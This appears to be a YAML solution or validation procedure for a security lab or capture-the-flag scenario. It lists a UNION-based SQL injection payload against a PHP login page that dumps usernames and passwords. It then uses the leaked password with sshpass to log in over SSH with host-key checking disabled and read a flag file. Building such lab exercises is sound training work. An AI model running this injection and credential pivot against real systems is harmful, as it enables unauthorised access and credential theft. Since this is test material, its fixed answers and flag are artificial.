- entity_id: sqli_login
  procedure:
    sessions: []
    procedure:
    - step_id: exploit_sqli_login
      session: null
      action:
        type: http_request
        method: POST
        url: http://${target_host}:${target_port}/index.php?page=login
        headers:
          Content-Type: application/x-www-form-urlencoded
        body: username=%27+UNION+SELECT+username%2Cpassword+FROM+users--+-&password=anything
      expect:
        body_contains: SuperSecret123
      outputs: {}
      timeout: 10
- entity_id: ssh_login_with_creds
  procedure:
    sessions: []
    procedure:
    - step_id: verify_ssh_running
      session: null
      action:
        type: exec_target
        command: pgrep -x sshd && echo 'SSH running'
      expect:
        stdout_contains: SSH running
      outputs: {}
      timeout: 10
    - step_id: install_sshpass
      session: null
      action:
        type: exec_attacker
        command: which sshpass || apt-get install -y sshpass
      expect:
        exit_code: 0
      outputs: {}
      timeout: 30
    - step_id: ssh_login_whoami
      session: null
      action:
        type: exec_attacker
        command: sshpass -p 'SuperSecret123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
          dbuser@${target_host} whoami
      expect:
        stdout_contains: dbuser
      outputs: {}
      timeout: 20
    - step_id: read_flag
      session: null
      action:
        type: exec_attacker
        command: sshpass -p 'SuperSecret123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
          dbuser@${target_host} cat /home/dbuser/flag.txt
      expect:
        stdout_contains: FLAG{ssh_pivot_successful_via_sqli_credentials}
      outputs: {}
      timeout: 20
